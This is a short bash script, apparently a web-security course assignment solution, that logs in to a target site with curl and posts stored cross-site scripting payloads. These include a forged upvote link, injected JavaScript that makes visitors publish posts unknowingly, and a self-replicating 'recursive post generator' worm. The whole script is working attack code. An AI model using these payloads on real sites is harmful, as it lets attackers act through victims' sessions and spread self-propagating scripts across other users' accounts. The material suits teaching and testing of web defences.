mkdir ~/A2
URL=$1

echo "login in as mallory"
curl -i -X POST -d 'username=mallory&password=MyPassword&form=login' -c  ~/A2/cookies.txt $1/post.php 
echo "dealing with q5a, making a fake title for upvote"
curl -i -X POST -d 'title=<a href="vote.php?id=5%26vote=1000"> FAKE TITLE CLICK ME TO UPVOTE 1000 TIMES </a>&content=test+content&type=1&form=content&submit=' -b  ~/A2/cookies.txt $1/post.php 
echo "dealing with q5b, making a post that will creat newpost"

curl -i -X POST -d 'title=<a href="javascript:makeAPost();">Click here to generate a new post</a>
<script>function makeAPost() {const xhr = new XMLHttpRequest();xhr.open("POST", "post.php", true);xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");xhr.send(`title=I Just Made A Post ON YOUR HEHAVE%26content=HAHAHAHAHA%26type=1%26form=content%26submit=`);}</script>
&content=test+content&type=1&form=content&submit=' -b  ~/A2/cookies.txt $1/post.php 

echo "dealing with q5c, recursive genration"

curl -i -X POST -d 'title=<label id="q5c">RECURSIVE POST GENERATOR :))))))</label>
<script>var buttons = document.querySelectorAll("#q5c");buttons.forEach(button => {button.addEventListener("click", function () {const xhr = new XMLHttpRequest();xhr.open("POST", "post.php", true);xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");xhr.send(`title=<label id="q5c">RECURSIVE POST GENERATOR :))))))</label>%26content=HAHAHAHAHA%26type=1%26form=content%26submit=`);});})</script>
&content=test+content&type=1&form=content&submit=' -b  ~/A2/cookies.txt $1/post.php 

